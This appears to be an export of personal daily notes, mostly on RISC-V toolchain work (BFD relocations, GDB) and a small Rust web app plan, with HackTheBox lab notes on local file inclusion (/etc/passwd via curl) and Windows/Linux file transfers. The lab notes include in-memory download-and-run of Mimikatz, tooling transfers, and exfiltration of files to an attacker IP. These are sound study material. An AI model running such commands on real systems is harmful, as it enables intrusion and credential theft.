    "content": "# 2022-06-29\n---\n## Web App Guide\nSource [here](https://joelmccracken.github.io/entries/a-simple-web-app-in-rust-pt-1/).\n\nEasy way to record when I take my creatine. When a link is tapped on the home screen, it records the visit and this preserves a record of when creatine was taken.\n\nIt is much easier to build separate, individual programs while exploring APIs instead of trying to do everything all at once.\n\nThe plan:\n1. Build a simple web server that displays \"hello world\" when visited.\n2. Build a tiny program that logs the formatted date and time whenever its run.\n3. Integrate the two into a single application.\n4. Deploy the application to a server (maybe Digital Ocean VPS?)\n\n## Included Write-Up (HTB)\nWebsites like `http://{target_IP}?file=home.php` are dynamically loaded and **local file inclusion** can be applied to it (sometimes).\n\nLocal file inclusion (also known as **LFI**) is the process of including files, that are  \nalready locally present on the server, through the exploitation of vulnerable inclusion  \nprocedures implemented in an application.  \n\nWe can easily determine if this is the case by attempting to load a file that we know definitely exists on the system and is readable by all users. One of those files is /etc/passwd and to load it, change the file parameter from home.php to /etc/passwd . For consistency reasons we will show this process with the cURL command line utility instead of a browser.   \n\nThis is successful and a list of users is returned. It is worth noting that inputting /etc/passwd might not always work if the inclusion already specifies a working directory. For instance, consider the following code:\n\n`curl 'http://{target_IP}/?file=/etc/passwd'`",
    "lastmodified": "2022-11-24T12:20:51.987420082Z",
    "tags": null
  },
  "/notes/daily/2022-07-03-relaxation": {
    "title": "2022-07-03 - Relaxation",
    "content": "# 2022-07-03\n---\n## Relaxation\n- Most companies do **assembly** relaxation whereas we do **linker** relaxation.\n\nThe assembler typically works on one source at a time so it can't see anything that is related to other source code files whereas the linker can. The linker is the more general solution.\n",
    "lastmodified": "2022-11-24T12:20:52.07881546Z",
    "tags": null
  },
  "/notes/daily/2022-07-04": {
    "title": "2022-07-04",
    "content": "# 2022-07-04\n---\n## CORE-V\nWe have a static relocation in `bfd/elfnn-riscv.c` (`perform_relocation`) which switches on the instruction type and encodes the instruction.\n\nThe way we were doing was we would have a `R_RISCV_RELOCID` as a case which would trigger a function, `riscv_elf_custom_relocid()` (the one similar to `add/sub`). \n\n`riscv_elf_custom_relocid()` lives in `bfd/elfxx-riscv.c` and it is a `bfd_reloc_status_type` function, which is the same type as `perform relocation`.\n\nTherefore, I think it is breaking because we shouldn't call `custom_relocid()` from `perform_relocation()` as they don't exist in the same space.\n\n```bash\n../bfd/.libs/libbfd.a(elf32-riscv.o): In function `perform_relocation':\n/home/pietraferreira/corev/build/binutils-gdb/bfd/elfnn-riscv.c:1653: undefined reference to `riscv_elf_custom_relocid'\n```\n\n### BFD_RELOC_RISCV_CVPCREL_UI12\n- PC relative.\n- Local.\n- Requires a 1-bit right shift.\n- Relocation number: 224\n- `dst_mask`: `ENCODE_ITYPE_IMM (-1U)`\n\nIt is a 12-bit relocation for 12-bit immediates found in `cv.starti` and `cv.endi`.\n\n- `bfd_reloc_status_type`: if this is non-null, then the supplied function is called rather than the normal function. This allows really strange relocation methods to be accommodated.\n\n- `riscv_reloc_name_lookup` and `riscv_elf_rtype_to_howto` both **get** `howto_table` elements, so maybe I need to have something looking into the `SECONDARYhowto_table`.\n\n### GDB\nTo run it:\n```bash\ngdb --args ~/corev/build/binutils-gdb/ld/ld-new -plugin /home/pietraferreira/corev/install/libexec/gcc/riscv32-corev-elf/12.0.0/liblto_plugin.so -plugin-opt=/home/pietraferreira/corev/install/libexec/gcc/riscv32-corev-elf/12.0.0/lto-wrapper -plugin-opt=-fresolution=test-03.o.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgloss -plugin-opt=-pass-through=-lgcc --sysroot=/home/pietraferreira/corev/install/riscv32-corev-elf -melf32lriscv -o test-03.o -L/home/pietraferreira/corev/install/lib/gcc/riscv32-corev-elf/12.0.0 -L/home/pietraferreira/corev/install/lib/gcc/riscv32-corev-elf/12.0.0/../../../../riscv32-corev-elf/lib -L/home/pietraferreira/corev/install/riscv32-corev-elf/lib test-03.o -lgcc --start-group -lc -lgloss --end-group -lgcc\n```\n\nTo compile:\n```bash\nriscv32-corev-elf-gcc -march=rv32imc_xcorevhwlp1p0 -g test-addi.s -o test-03.o -save-temps -nostartfiles -v\n```\n\nTo add missing directories to GDB:\n```bash\n# in GDB:\ndir ~/corev/binutils-gdb/bfd/\n```\n\nTo get debug information:\n```\nmake clean\n```\n\n```\nmake all-ld CFLAGS='-O0 -g3'\n```\n\n## BFD\n- Sections: each section contains the name of the section, the section's original address in the object file, size and alignment information, various flags, and pointers into other BFD data structures.\n\n- Symbols: they each contain a pointer to the information for the object file which originally defined it, its name, its value and various flag bits. When a BFD back end reads in a symbol table, it relocates all symbols to make them relative to the base of the section where they were defined. \n\n## Sanitisers\n```c\nint atoi(const char *str);\n\nint arr[10] = {1,2,3,4,5,6,7,8,9,10};\n\nint main(int argc, char **argv) {\nreturn arr[atoi(argv[1])];\n}\n```\n\nIf we enable `fsanitize=address`, it runs about 3x slower but it \"catches overflows\".",
    "lastmodified": "2022-11-24T12:20:52.118653536Z",
    "tags": null
  },
  "/notes/daily/2022-07-05": {
    "title": "2022-07-05",
    "content": "# 2022-07-05\n---\n## BFD Front End\nA BFD has type `bfd`. Using BFD consists of making references through the BFD and to data in the BFD.\n\n### COFF\nStands for **Common Object File Format**.\n\nIt replaced the previously used `a.out` format.\n\n### Relocations\nThey are left alone until required, then read in en-mass and translated into an internal form. They are maintained on a per section basis, while symbols are maintained on a per BFD basis.\n\nAll that the back end has to do to fit the BFD interface is to create a `struct reloc_cache_entry` for each relocation in a particular section, and fill in the right bits of the structure.\n\n### Howto\nThe **howto** field can be imagined as a relocation instruction. It is a pointer to a structure which contains information on what to do with all of the other information in the reloc record and data section. A back end would normally have a relocation instruction set and turn relocations into pointers to the correct structure on input.\n\n### Writing Relocations\nThe back end steps through the canonical relocation table and creates an `internal_reloc`. The symbol index to use is removed from the `offset` field in the symbol table supplied. The address comes directly from the sum of the section base address and the relocation offset.\n\nThe type is dug directly from the `howto` field. Then the `internal_reloc` is swapped into the shape of an `external_reloc` and written out to disk.\n\n### Reading Relocations\nThe internal form of relocation is `arelent`.\n\nReading a coff relocation table is done in the following stages:\n- Read the entire relocation table into memory.\n- Process each relocation in turn; first swap it from the external to the internal form.\n- Turn the symbol referenced in the relocation's symbol index into a pointer into the canonical symbol table. The back end will call that routine and save the result if a canonicalisation hasn't been done.\n- The reloc index is turned into a pointer to a howto structure, in a back end specific way. For instance, the **386** and **960** use the `r_type` to directly produce an index into a howto table vector; the **88k** subtracts a number from the `r_type` field and creates an addend field.",
    "lastmodified": "2022-11-24T12:20:52.28053534Z",
    "tags": null
  },
  "/notes/daily/2022-07-06": {
    "title": "2022-07-06",
    "content": "# 2022-07-06\n---\n# HTB\n## File Transfers\n### PowerShell Base64 Encode and Decode\nWe can encode a file to a base64 string, copy contents from the terminal and then perform the reverse operation, meaning decoding the file in the original content.\n\n```bash\nPietra@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n```\n\n```bash\nPietra@htb[/htb]$ cat id_rsa |base64 -w 0;echo\n\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\n```\n\nThen we copy it and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it:\n\n```powershell\nPS C:\\htb\u003e [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\"))\n```\n\nFinally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.\n\n```powershell\nPS C:\\htb\u003e Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nMD5             4E301756A07DED0A2DD6953ABF015278                                       C:\\Users\\Public\\id_rsa\n```\n\nWhile this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.\n\n### Downloading Files using PowerShell\n- DownloadFile method: we can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.\n\n```powershell\nPS C:\\htb\u003e # Example: (New-Object Net.WebClient).DownloadFile('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e')\n\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\htb\u003e # Example: (New-Object Net.WebClient).DownloadFileAsync('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e')\n\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')\n```\n\n- Fileless Method: as we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.\n\n```powershell\nPS C:\\htb\u003e IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n```\n\n`IEX` also accepts pipeline input.\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n```\n\n- Invoke-WebRequest: from PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.\n\n```powershell\nPS C:\\htb\u003e Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n```\n\nHarmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). \n\n### Setup Internet Explorer Error\n\n![image](https://academy.hackthebox.com/storage/modules/24/IE_settings.png)\n\nCan be bypassed using the parameter `-UseBasicParsing`:\n\n```powershell\nPS C:\\htb\u003e Invoke-WebRequest https://\u003cip\u003e/PowerView.ps1 | IEX\n\nInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.\nAt line:1 char:1\n+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException\n+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n\nPS C:\\htb\u003e Invoke-WebRequest https://\u003cip\u003e/PowerView.ps1 -UseBasicParsing | IEX\n```\n\n### SMB Downloads\nThe Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.\n\nWe can use SMB to download files easily. We need to create an SMB server with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.\n\n- Create the server:\n```shell\nPietra@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n- Copy file from SMB server:\n```cmd\nC:\\htb\u003e copy \\\\192.168.220.133\\share\\nc.exe\n\n        1 file(s) copied.\n```\n\nIn this case:\n\n```cmd\nC:\\htb\u003e copy \\\\192.168.220.133\\share\\nc.exe\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\n```\n\nWe can set the username and password using the Impacket SMB server and mount it on our windows target machine:\n\n1. Create the SMB server with a username and password:\n```shell\nPietra@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n2. Mount the SMB Server with username and password:\n\n```cmd\nC:\\htb\u003e net use n: \\\\192.168.220.133\\share /user:test test\n\nThe command completed successfully.\n\nC:\\htb\u003e copy n:\\nc.exe\n        1 file(s) copied.\n```\n\n### FTP Downloads\nAnother way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.\n\nWe can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:\n\n- Installing the FTP Server Python3 Module - pyftpdlib\n\n```shell\nPietra@htb[/htb]$ sudo pip3 install pyftpdlib\n```\n\nThen we can specify port number 21 because, by default, `pyftpdlib` uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.\n\n- Setting up a Python3 FTP Server\n\n```shell\nPietra@htb[/htb]$ sudo python3 -m pyftpdlib --port 21\n\n[I 2022-05-17 10:09:19] concurrency model: async\n[I 2022-05-17 10:09:19] masquerade (NAT) address: None\n[I 2022-05-17 10:09:19] passive ports: None\n[I 2022-05-17 10:09:19] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=3210 \u003c\u003c\u003c\n```\n\nAfter the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.\n\n- Transfering Files from an FTP Server Using PowerShell\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')\n```\n\nWhen we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.\n\n- Create a Command File for the FTP Client and Download the Target File\n\n```cmd\nC:\\htb\u003e echo open 192.168.49.128 \u003e ftpcommand.txt\nC:\\htb\u003e echo USER anonymous \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo binary \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo GET file.txt \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo bye \u003e\u003e ftpcommand.txt\nC:\\htb\u003e ftp -v -n -s:ftpcommand.txt\nftp\u003e open 192.168.49.128\nLog in with USER and PASS first.\nftp\u003e USER anonymous\n\nftp\u003e GET file.txt\nftp\u003e bye\n\nC:\\htb\u003emore file.txt\nThis is a test file\n```\n\n## Upload Operations\n### PowerShell Base64 Encode and Decode\n- Encode using PowerShell:\n\n```powershell\nPS C:\\htb\u003e [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=\nPS C:\\htb\u003e Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n\nHash\n----\n3688374325B992DEF12793500307566D\n```\n\nWe copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.\n\n- Decode Base64 String in Linux:\n\n```shell\nPietra@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d \u003e hosts\nPietra@htb[/htb]$ md5sum hosts \n3688374325b992def12793500307566d  hosts\n```\n\n### PowerShell Web Uploads\nPowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.\n\nFor our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.\n\n- Installing a configured WebServer with upload:\n\n```shell\nPietra@htb[/htb]$ pip3 install upload server\n\nPietra@htb[/htb]$ python3 -m uploadserver\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\nNow we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-WebRequest` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.\n\n- PowerShell script to upload a file to Python upload server:\n\n```powershell\nPS C:\\htb\u003e IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\htb\u003e Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n\n[+] File Uploaded:  C:\\Windows\\System32\\drivers\\etc\\hosts\n[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373\n```\n\n### PowerShell Base64 Web Upload\nAnother way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.\n\n```powershell\nPS C:\\htb\u003e $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\htb\u003e Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n```\n\nWe catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.\n\n```shell\nPietra@htb[/htb]$ nc -lvnp 8000\nPietra@htb[/htb]$ echo \u003cbase64\u003e | base64 -d -w 0 \u003e hosts\n```\n\n### SMB Uploads\nWe previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).\n\nAn alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [RFC 4918](https://datatracker.ietf.org/doc/html/rfc4918|(RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.\n\nWhen you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.\n\n![Image](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)\n\n#### Configuring webdav server\nTo set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.\n\n- Installing WebDav Python modules:\n\n```shell\nPietra@htb[/htb]$ sudo pip install wsgidav cheroot\n\n[sudo] password for plaintext: \nCollecting wsgidav\n  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)\n     |████████████████████████████████| 171 kB 1.4 MB/s\n     ...SNIP...\n```\n\n- Using the WebDav Python module:\n\n```shell\nPietra@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n\n[sudo] password for plaintext: \nRunning without configuration file.\n10:02:53.949 - WARNING : App 